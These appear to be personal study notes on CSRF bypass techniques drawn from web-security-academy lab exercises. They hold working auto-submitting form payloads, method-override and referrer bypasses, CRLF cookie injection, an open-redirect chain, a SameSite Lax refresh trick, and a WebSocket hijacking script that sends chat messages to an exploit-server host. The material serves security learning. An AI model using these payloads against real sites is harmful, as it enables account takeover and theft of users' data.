### CSRF bybass methods
- NO csrf token
- weak csrf token
- check content type
- check referer header
- chnage POST to GET or GET to post
- same site cookies bypasses 

### CSRF token bybass methods
- reomving ANI-csrf token
- NO check for the users token
- weak token
- Reasuable token
- change request method
- Guessable token
- Bybass referer

### method attacks
- remove referer header and send request and check response
- remove original header and send request and check response
- remove csrf  token and send request and check response



### Basic method no defenses
- the request
```
POST /myaccount/changeemail
HOST:


email=....
```

- the exploit
```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>

```
### CSRF where token validation depends on token being present
- the request
```
POST /myaccount/changeemail
HOST:


email=....&csrftoken=.....
```
- TIPS: reomve the csrf token
-THE exploit

```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

### CSRF where token validation depends on request method
- the request
```
POST /myaccount/changeemail
HOST:


email=....&csrftoken=.....
```
- TIPS: reomve the csrf token
- Tips: change request TO GET in CSRF payloads
-THE exploit

```html
<form action="" method="GET">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

### CSRF where token is not tied to user session
- steps                                                                                                                                                                     
1- create two accounts                                                                                                                                                                     
2- go to the first account and change email we will change                                                                                                                                                                     
3- go to second account and try intersept change email then drop request , copy the csrf token                                                                                                                                                                     
4- go to the first account and put csrf token(second account) and try change email is valid or not


### csrf bypass via method override
```
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="" method="GET">
   <input type="hidden" name="_method" value="POST">
   <input type="hidden" name="email" value="">
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

### double csrf tokens 
if there is non ssession cookie called csrf or smth like that 
	- value is the same  or different from CSRF token it might be vulnerable 
		- it might be double submitting or using another tied to csrf token 
		- in the both cases we need to inject cookie value in the victim's browser 
		- we need to find an endpoint that vulnerable to header injection like `<img src="https:victim.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"`  here we have the search parameter takes the value given and add a cookie without validation   
		- this what will be on the poc `<img src="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20srf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"` 

### CSRF where token is duplicated in cookie
```html
<html>
<body>
   <script>history.pushState(' ',' ','/')</script>
   <form action="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/my-account/change-email" method="POST"/>
   <input type="hidden" name="email" value="a@gmail.com"/>
   <input type="hidden" name="csrf" value="fake"/>
   <input type="submit" value="submit request"/>
   </form>
   <img src="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   </body>
</html>
```
### CSRF where Referrer validation depends on header being present
```html
<html>
<head>
   <meta name="referrer" content="no-referrer" >
</head>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="https://0a390078039fe0a780e435a600ca0059.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

### CSRF with broken Referrer validation
```html
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/?0ad4003504bb812580aae57c00c40072.web-security-academy.net')</script>
   <form action="https://0ad4003504bb812580aae57c00c40072.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

# same site cookie issues with the CSRF 
## definition of every type 
### Strict

If a cookie is set with the `SameSite=Strict` attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.

This is recommended when setting cookies that enable the bearer to modify data or perform other sensitive actions, such as accessing specific pages that are only available to authenticated users.

Although this is the most secure option, it can negatively impact the user experience in cases where cross-site functionality is desirable.

### Lax

`Lax` SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:

- The request uses the `GET` method.
    
- The request resulted from a top-level navigation by the user, such as clicking on a link.
    

This means that the cookie is not included in cross-site `POST` requests, for example. As `POST` requests are generally used to perform actions that modify data or state (at least according to best practice), they are much more likely to be the target of CSRF attacks.

Likewise, the cookie is not included in background requests, such as those initiated by scripts, iframes, or references to images and other resources.

### None

If a cookie is set with the `SameSite=None` attribute, this effectively disables SameSite restrictions altogether, regardless of the browser. As a result, browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites.

With the exception of Chrome, this is the default behavior used by major browsers if no `SameSite` attribute is provided when setting the cookie.

There are legitimate reasons for disabling SameSite, such as when the cookie is intended to be used from a third-party context and doesn't grant the bearer access to any sensitive data or functionality. Tracking cookies are a typical example.

If you encounter a cookie set with `SameSite=None` or with no explicit restrictions, it's worth investigating whether it's of any use. When the "Lax-by-default" behavior was first adopted by Chrome, this had the side-effect of breaking a lot of existing web functionality. As a quick workaround, some websites have opted to simply disable SameSite restrictions on all cookies, including potentially sensitive ones.

When setting a cookie with `SameSite=None`, the website must also include the `Secure` attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.

`Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`

## bypassing 

###  if he don't use CSRF token but uses `lax` or default same site cookie settings 
if he uses `lax` `chrome` initiates `lax` after `120 sec` 
if he accepts the submission over a `get` request then we can overwrite the method at CSRF POC 
as we know when using `lax` we can only make the victim send cookie cross sited only if he uses get request so we can over write it like that 
```html
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="" method="GET">
   <input type="hidden" name="_method" value="POST">
   <input type="hidden" name="email" value="">
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```
we trick the browser by make the method of the form `get` but we overwrite it in the next step 

### if the web site made the cookie `srtict`
so we have nothing to do but finding  a redirect in the website and the endpoint of the CSRF vulnerable function accepts `GET` request so we need to manipulate the URL for redirect to our endpoint and with all parameters and redirections 
```js
<script>
window.location="https://0aa200ba03bde9e280e2088d006f00be.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail%3dyoussefsemira1%2540gmail.com%26submit%3d1";
</script>
```
so we made a script that redirects us to the vulnerable endpoint with the new credentials 

### if the web site made the cookie `srtict` again 
but u can't find any redirection in you r domain so if you found the `CORS`header `acces-control=allow=inrigin=origin.com` so if you found any vulnerability in that domain that means that you can exploit the `CSRF` 


this code is for hijacking the websocket by another domain 
```js 
<script>
var webSocket = new WebSocket(
    "wss://0a7a007e033d38b38015171c000700c4.web-security-academy.net/chat"
);

webSocket.onopen = function (evt) {
    webSocket.send("READY");
};

webSocket.onmessage = function (evt) {
    var message = evt.data;
    fetch(
        "https://exploit-0ad2007d03e4382c8000167001200042.exploit-server.net/exploit?message=" + 
        btoa(message)
    );
}
</script>

```
### if he using default same site cookie settings  
and you want to `bypasses` the restriction of advantages the settings for `lax for chrome users`
if the user have been logged in within 120 sec the attack will work without any restriction but if the time exceeded the 120 sec it gonnna be impossible  so we need to fiend a way to refresh the cookies 

at our lab we have 0Auth authentication method  every time we visit specific page the whole authentication process regenerates  so we need the user just visit this page first and then we apply on him the CSRF payload 


so I made this  payload 
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@web-security-academy.net"> </form>
<script>
window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); 
function changeEmail()
{ document.forms[0].submit(); }
</script>
```
but the redirection keeps blocking cuz there is no interaction happen to prompt 
so i made another one 

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> 
<p>Click anywhere on the page</p> 
<script>
window.onclick = () => 
{ window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } 
function changeEmail() {
document.forms[0].submit(); 
} </script>
```
we make the user click any where at the page and the prompt happened and it worked 
